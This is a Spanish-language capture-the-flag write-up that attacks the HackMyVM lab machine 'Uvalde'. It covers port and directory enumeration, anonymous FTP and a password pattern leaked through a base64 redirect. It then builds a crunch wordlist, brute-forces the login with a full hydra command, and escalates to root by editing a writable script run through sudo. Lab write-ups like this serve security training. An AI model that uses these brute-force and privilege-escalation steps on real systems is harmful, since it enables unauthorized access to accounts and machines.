---
layout: post
title: Uvalde - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Cromiphi \\
**Dificultad**: Fácil

![img](/imgs/write-ups/hackmyvm/uvalde/uvalde.png#center)

## Reconocimiento

Comienzo con un escaneo de puertos y servicios disponibles en la máquina.

```
$ sudo nmap -p- 192.168.1.49       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 12:41 EST
Nmap scan report for 192.168.1.49
Host is up (0.000096s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### FTP (21)

El servidor FTP tiene disponible el acceso como usuario anónimo. Dentro encuentro el archivo output.

```
$ ftp 192.168.1.49          
Connected to 192.168.1.49.
220 (vsFTPd 3.0.3)
Name (192.168.1.49:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||56565|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        116          4096 Jan 28 19:55 .
drwxr-xr-x    2 0        116          4096 Jan 28 19:55 ..
-rw-r--r--    1 1000     1000         5154 Jan 28 19:54 output
226 Directory send OK.
ftp> 
```

Una vez descargado se puede ver que aparece el nombre un usuario local de la máquina, **Matthew**.

```
$ cat output 
Script démarré sur 2023-01-28 19:54:05+01:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="105" LINES="25"]
matthew@debian:~$ id
uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)
matthew@debian:~$ ls -al
total 32
drwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .
drwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..
lrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc
drwx------ 3 matthew matthew 4096 23 janv. 08:04 .config
drwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local
[...]
```

Apunto el nombre, será importante mas adelante.

### HTTP (80)

Continuando con la enumeración, utilizo gobuster para encontrar archivos y subdirectorios.

```
$ gobuster dir -u "http://192.168.1.49" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
[...]
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 29604]
/img                  (Status: 301) [Size: 310] [--> http://192.168.1.49/img/]
/login.php            (Status: 200) [Size: 1022]
/user.php             (Status: 302) [Size: 0] [--> login.php]
/mail                 (Status: 301) [Size: 311] [--> http://192.168.1.49/mail/]
/css                  (Status: 301) [Size: 310] [--> http://192.168.1.49/css/]
/js                   (Status: 301) [Size: 309] [--> http://192.168.1.49/js/]
/success.php          (Status: 302) [Size: 0] [--> login.php]
/vendor               (Status: 301) [Size: 313] [--> http://192.168.1.49/vendor/]
/create_account.php   (Status: 200) [Size: 1003]
Progress: 59995 / 441122 (13.60%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/02/17 12:44:10 Finished
===============================================================
```

Entre todos estos hay que destacar "/create_account.php" y "/login.php".

Utilizando Burpsuite, capturo la petición POST y como se puede ver solo toma el dato "username".

```
POST /create_account.php HTTP/1.1
Host: 192.168.1.49
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://192.168.1.49
Connection: close
Referer: http://192.168.1.49/create_account.php
Upgrade-Insecure-Requests: 1

username=asdf
```

Realizo la misma petición que antes pero utlizando curl.

```
$ curl -X POST http://192.168.1.49/create_account.php -d "username=L0rdP4" -i -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 192.168.1.49:80...
* Connected to 192.168.1.49 (192.168.1.49) port 80 (#0)
> POST /create_account.php HTTP/1.1
> Host: 192.168.1.49
> User-Agent: curl/7.87.0
> Accept: */*
> Content-Length: 15
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
HTTP/1.1 302 Found
< Date: Fri, 17 Feb 2023 17:49:54 GMT
Date: Fri, 17 Feb 2023 17:49:54 GMT
< Server: Apache/2.4.54 (Debian)
Server: Apache/2.4.54 (Debian)
< Set-Cookie: UserName=registred; expires=Fri, 17-Feb-2023 18:49:54 GMT; Max-Age=3600
Set-Cookie: UserName=registred; expires=Fri, 17-Feb-2023 18:49:54 GMT; Max-Age=3600
< Location: success.php?dXNlcm5hbWU9TDByZFA0JnBhc3N3b3JkPUwwcmRQNDIwMjNAODAxMQ==
Location: success.php?dXNlcm5hbWU9TDByZFA0JnBhc3N3b3JkPUwwcmRQNDIwMjNAODAxMQ==
< Content-Length: 1031
Content-Length: 1031
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8
[...]
```

En la respuesta se puede ver el archivo **sucess.php** seguido de un texto en Base64.

```
echo "dXNlcm5hbWU9TDByZFA0JnBhc3N3b3JkPUwwcmRQNDIwMjNAODAxMQ" -n | base64 -d
username=L0rdP4&password=L0rdP42023@8011
```

Me devuelve la el usuario introducido en la petición y una contraseña generada automaticamente.

Supongo que el usuario Matthew generó la contraseña de la misma manera, así que utilizo **crunch** para generar una lista con el mismo formato.

Password = nombre de usuario + 2023 + @ + número aleatorio de 4 cifras

```
$ crunch 16 16 -t matthew2023@%%%% -l aaaaaaaaaaa@aaaa > matth.list             
Crunch will now generate the following amount of data: 170000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 10000 
                                                                                                                   
$ head matth.list                                                      
matthew2023@0000
matthew2023@0001
matthew2023@0002
matthew2023@0003
[...]
```

## Explotación

Una vez he generado la lista, utilizo **hydra** para crackear la contraseña en /login.php.

```
$ hydra -l matthew -P matth.list 192.168.1.49 http-post-form '/login.php:username=matthew&password=^PASS^:<input type="submit" value="Login">' 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
[...]
[DATA] attacking http-post-form://192.168.1.49:80/login.php:username=matthew&password=^PASS^:<input type="submit" value="Login">
[80][http-post-form] host: 192.168.1.49   login: matthew   password: matthew*********
1 of 1 target successfully completed, 1 valid password found
```

Intento logearme mediante **ssh** en caso que Matthew haya reutilizado la contraseña.

```
$ ssh matthew@192.168.1.49
[...]
matthew@uvalde:~$ :)
```

Estoy dentro.

## Escalado de privilegios

Matthew tiene permisos de sudo para ejecutar **/opt/superhack** como cualquier usuario.

```
matthew@uvalde:~$ sudo -l
Matching Defaults entries for matthew on uvalde:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
```

Al ejecutar un simple **ls** se puede ver que Matthew tiene permisos de lectura y escritura sobre superhack.

Sabiendo esto simplemento lo edito para que se ejecute **bash** y haciendo uso de los mágicos poderes de sudo obtengo la shell como root.

```
matthew@uvalde:/opt$ ls -la /opt
total 12
drwx---rwx  2 root    root    4096 Feb 17 18:58 .
drwxr-xr-x 18 root    root    4096 Jan 22 15:31 ..
-rw-r--r--  1 matthew matthew    5 Feb 17 18:58 superhack
matthew@uvalde:/opt$ echo "bash" > superhack
matthew@uvalde:/opt$ sudo /bin/bash /opt/superhack
root@uvalde:/opt# :)
```

Muchas gracias a **Cromiphi** por esta máquina.
